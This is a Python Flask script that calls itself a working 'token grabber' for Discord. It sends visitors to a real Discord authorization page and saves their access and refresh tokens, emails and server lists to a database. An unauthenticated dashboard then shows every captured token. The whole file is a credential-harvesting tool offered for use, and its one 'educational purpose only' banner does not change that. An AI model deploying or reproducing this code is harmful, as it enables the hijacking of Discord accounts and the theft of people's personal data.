#!/usr/bin/env python3
"""
=============================================================
TOKEN GRABBER VIA DISCORD OAUTH - REAL WORKING
=============================================================
"""

import os, json, sqlite3, secrets, requests, threading, asyncio
from flask import Flask, request, redirect, jsonify, render_template_string
from flask_cors import CORS
from datetime import datetime

# ═════════════════════════════════════════════════════════════════════════════
# CONFIG
# ═════════════════════════════════════════════════════════════════════════════

CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
REDIRECT_URI = os.getenv('REDIRECT_URI', 'https://edith.up.railway.app/callback')

if not CLIENT_ID or not CLIENT_SECRET:
    print("❌ CLIENT_ID or CLIENT_SECRET missing!")
    exit(1)

# Database
conn = sqlite3.connect('tokens.db', check_same_thread=False)
c = conn.cursor()
c.execute("""
    CREATE TABLE IF NOT EXISTS tokens (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        username TEXT,
        email TEXT,
        access_token TEXT,
        refresh_token TEXT,
        guilds TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
""")
conn.commit()

app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(32)
CORS(app)

# ═════════════════════════════════════════════════════════════════════════════
# ROUTE 1: HOME PAGE - REDIRECT TO DISCORD OAUTH
# ═════════════════════════════════════════════════════════════════════════════

@app.route('/')
def home():
    """Redirect to REAL Discord OAuth"""
    oauth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds"
    return redirect(oauth_url)

# ═════════════════════════════════════════════════════════════════════════════
# ROUTE 2: OAUTH CALLBACK - GET TOKEN
# ═════════════════════════════════════════════════════════════════════════════

@app.route('/callback')
def callback():
    """Discord redirects here with code"""
    code = request.args.get('code')
    
    if not code:
        return "❌ No code received!", 400

    print(f"📥 Code received: {code[:20]}...")

    # Exchange code for token
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    
    try:
        resp = requests.post('https://discord.com/api/oauth2/token', data=data)
        token_data = resp.json()
        print(f"✅ Token data received")
    except Exception as e:
        print(f"❌ Error: {e}")
        return f"❌ Error: {e}", 400

    if 'access_token' not in token_data:
        print(f"❌ No access token: {token_data}")
        return f"❌ No access token: {token_data}", 400

    access_token = token_data['access_token']
    refresh_token = token_data.get('refresh_token')

    # Get user info
    headers = {'Authorization': f'Bearer {access_token}'}
    user_resp = requests.get('https://discord.com/api/users/@me', headers=headers)
    user_data = user_resp.json()

    # Get user guilds
    guilds_resp = requests.get('https://discord.com/api/users/@me/guilds', headers=headers)
    guilds_data = guilds_resp.json()

    # SAVE TO DATABASE
    c.execute("""
        INSERT INTO tokens (user_id, username, email, access_token, refresh_token, guilds)
        VALUES (?, ?, ?, ?, ?, ?)
    """, (
        user_data.get('id'),
        user_data.get('username'),
        user_data.get('email', ''),
        access_token,
        refresh_token,
        json.dumps(guilds_data)
    ))
    conn.commit()

    print("=" * 60)
    print("🎯 TOKEN CAPTURED!")
    print(f"   User: {user_data.get('username')}")
    print(f"   ID: {user_data.get('id')}")
    print(f"   Email: {user_data.get('email')}")
    print(f"   Token: {access_token[:40]}...")
    print("=" * 60)

    # Return success page
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>✅ Authorized</title>
        <style>
            body { font-family: Arial; background: #0a0a1a; color: white; text-align: center; padding: 50px; }
            .success { color: #4CAF50; font-size: 60px; }
            .token { font-family: monospace; background: #1a1a2e; padding: 15px; border-radius: 10px; word-break: break-all; max-width: 600px; margin: 20px auto; }
        </style>
    </head>
    <body>
        <div class="success">✅</div>
        <h1>Authorization Successful!</h1>
        <p>Token captured for <strong>{{ username }}</strong></p>
        <div class="token">{{ token[:40] }}...</div>
        <p>You can close this window.</p>
    </body>
    </html>
    """, username=user_data.get('username'), token=access_token)

# ═════════════════════════════════════════════════════════════════════════════
# ROUTE 3: DASHBOARD - VIEW TOKENS
# ═════════════════════════════════════════════════════════════════════════════

@app.route('/dashboard')
def dashboard():
    data = c.execute("SELECT * FROM tokens ORDER BY id DESC").fetchall()
    
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>🔐 Token Dashboard</title>
        <style>
            body { font-family: 'Segoe UI', Arial; background: #0a0a1a; color: white; padding: 20px; }
            .container { max-width: 1400px; margin: 0 auto; }
            h1 { color: #5865F2; }
            .stats { display: flex; gap: 20px; margin-bottom: 20px; }
            .stat-card { background: #1a1a2e; padding: 20px; border-radius: 10px; }
            .stat-number { font-size: 2.5em; font-weight: bold; color: #5865F2; }
            table { width: 100%; border-collapse: collapse; background: #1a1a2e; border-radius: 10px; overflow: hidden; }
            th { background: #2a2a4e; padding: 12px; text-align: left; color: #5865F2; }
            td { padding: 10px 12px; border-bottom: 1px solid #2a2a4e; }
            .token { font-family: monospace; font-size: 11px; color: #f23f3f; word-break: break-all; max-width: 200px; }
            .warning { color: #f23f3f; border: 1px solid #f23f3f40; padding: 10px; border-radius: 8px; margin: 10px 0; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔐 Token Dashboard</h1>
            <div class="warning">⚠️ EDUCATIONAL PURPOSE ONLY</div>
            <div class="stats">
                <div class="stat-card"><div class="stat-number">""" + str(len(data)) + """</div><div>Tokens Captured</div></div>
            </div>
            <table>
                <tr><th>ID</th><th>User</th><th>Email</th><th>Token</th><th>Guilds</th><th>Time</th></tr>
    """
    
    for row in data:
        guilds = len(json.loads(row[6])) if row[6] else 0
        html += f"""
        <tr>
            <td>{row[0]}</td>
            <td>{row[2]}</td>
            <td>{row[3]}</td>
            <td><span class="token">{row[4][:50]}...</span></td>
            <td>{guilds}</td>
            <td>{row[7]}</td>
        </tr>
        """
    
    html += "</table></div></body></html>"
    return html

# ═════════════════════════════════════════════════════════════════════════════
# RUN
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    port = int(os.getenv('PORT', 8080))
    print("=" * 60)
    print("🚀 TOKEN GRABBER VIA DISCORD OAUTH")
    print("=" * 60)
    print(f"🌐 URL: http://localhost:{port}")
    print(f"📊 Dashboard: http://localhost:{port}/dashboard")
    print("=" * 60)
    app.run(host='0.0.0.0', port=port, debug=False)
